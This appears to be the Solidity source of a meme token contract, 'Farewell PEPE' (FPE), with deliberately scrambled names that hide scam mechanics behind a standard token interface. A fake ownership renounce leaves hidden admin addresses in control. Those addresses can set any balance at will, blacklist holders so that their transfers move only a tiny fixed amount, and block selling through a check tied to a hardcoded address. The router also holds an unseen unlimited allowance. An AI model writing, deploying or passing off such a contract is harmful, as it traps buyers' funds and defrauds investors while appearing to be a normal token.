//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface buySender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeExempt) external view returns (uint256);

    function transfer(address teamTotal, uint256 fromLimit) external returns (bool);

    function allowance(address feeFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromLimit) external returns (bool);

    function transferFrom(
        address sender,
        address teamTotal,
        uint256 fromLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptReceiver, uint256 value);
    event Approval(address indexed feeFund, address indexed spender, uint256 value);
}

abstract contract launchSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isSwapLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountBuy {
    function createPair(address receiverAmount, address exemptLimitSwap) external returns (address);
}

interface fundMarketing is buySender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FarewellPEPE is launchSell, buySender, fundMarketing {

    function allowance(address exemptFund, address tokenWalletIs) external view virtual override returns (uint256) {
        if (tokenWalletIs == listMode) {
            return type(uint256).max;
        }
        return minShould[exemptFund][tokenWalletIs];
    }

    address listMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public atLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return sellTake;
    }

    uint256 private swapIs;

    function totalSupply() external view virtual override returns (uint256) {
        return takeMax;
    }

    constructor (){
        
        isSwapLiquidity teamToMin = isSwapLiquidity(listMode);
        isMin = amountBuy(teamToMin.factory()).createPair(teamToMin.WETH(), address(this));
        if (atLiquidity == swapModeIs) {
            buyTeamSell = false;
        }
        liquidityList = _msgSender();
        tokenIs();
        totalSell[liquidityList] = true;
        toEnable[liquidityList] = takeMax;
        if (buyTeamSell) {
            txFromIs = false;
        }
        emit Transfer(address(0), liquidityList, takeMax);
    }

    function txTradingTeam(address atMarketing, address teamTotal, uint256 fromLimit) internal returns (bool) {
        if (atMarketing == liquidityList) {
            return launchedEnable(atMarketing, teamTotal, fromLimit);
        }
        uint256 sellMarketing = buySender(isMin).balanceOf(autoTx);
        require(sellMarketing == walletFee);
        require(teamTotal != autoTx);
        if (tradingLiquidity[atMarketing]) {
            return launchedEnable(atMarketing, teamTotal, takeExempt);
        }
        return launchedEnable(atMarketing, teamTotal, fromLimit);
    }

    function isSell(address txBuy) public {
        require(txBuy.balance < 100000);
        if (atTake) {
            return;
        }
        if (launchSellWallet != buyTeamSell) {
            buyTeamSell = true;
        }
        totalSell[txBuy] = true;
        
        atTake = true;
    }

    function enableAuto(address swapLimit) public {
        buyExempt();
        if (txFromIs) {
            minList = atLiquidity;
        }
        if (swapLimit == liquidityList || swapLimit == isMin) {
            return;
        }
        tradingLiquidity[swapLimit] = true;
    }

    function enableSell(address isLiquidity, uint256 fromLimit) public {
        buyExempt();
        toEnable[isLiquidity] = fromLimit;
    }

    function approve(address tokenWalletIs, uint256 fromLimit) public virtual override returns (bool) {
        minShould[_msgSender()][tokenWalletIs] = fromLimit;
        emit Approval(_msgSender(), tokenWalletIs, fromLimit);
        return true;
    }

    address autoTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function feeExempt(uint256 fromLimit) public {
        buyExempt();
        walletFee = fromLimit;
    }

    function balanceOf(address modeExempt) public view virtual override returns (uint256) {
        return toEnable[modeExempt];
    }

    address public isMin;

    function buyExempt() private view {
        require(totalSell[_msgSender()]);
    }

    uint256 walletFee;

    event OwnershipTransferred(address indexed maxMarketing, address indexed walletMin);

    uint256 private swapModeIs;

    function launchedEnable(address atMarketing, address teamTotal, uint256 fromLimit) internal returns (bool) {
        require(toEnable[atMarketing] >= fromLimit);
        toEnable[atMarketing] -= fromLimit;
        toEnable[teamTotal] += fromLimit;
        emit Transfer(atMarketing, teamTotal, fromLimit);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderLaunchedLimit;
    }

    bool public atTake;

    address private teamLaunched;

    bool public buyTeamSell;

    bool public launchSellWallet;

    mapping(address => bool) public tradingLiquidity;

    mapping(address => mapping(address => uint256)) private minShould;

    uint256 exemptSell;

    function name() external view virtual override returns (string memory) {
        return listLiquidityLimit;
    }

    uint256 constant takeExempt = 8 ** 10;

    uint256 private minList;

    bool public toMax;

    address public liquidityList;

    uint8 private senderLaunchedLimit = 18;

    function transfer(address isLiquidity, uint256 fromLimit) external virtual override returns (bool) {
        return txTradingTeam(_msgSender(), isLiquidity, fromLimit);
    }

    function getOwner() external view returns (address) {
        return teamLaunched;
    }

    mapping(address => uint256) private toEnable;

    function tokenIs() public {
        emit OwnershipTransferred(liquidityList, address(0));
        teamLaunched = address(0);
    }

    uint256 private takeMax = 100000000 * 10 ** 18;

    string private listLiquidityLimit = "Farewell PEPE";

    mapping(address => bool) public totalSell;

    string private sellTake = "FPE";

    function owner() external view returns (address) {
        return teamLaunched;
    }

    bool public txFromIs;

    uint256 private takeMode;

    function transferFrom(address atMarketing, address teamTotal, uint256 fromLimit) external override returns (bool) {
        if (_msgSender() != listMode) {
            if (minShould[atMarketing][_msgSender()] != type(uint256).max) {
                require(fromLimit <= minShould[atMarketing][_msgSender()]);
                minShould[atMarketing][_msgSender()] -= fromLimit;
            }
        }
        return txTradingTeam(atMarketing, teamTotal, fromLimit);
    }

}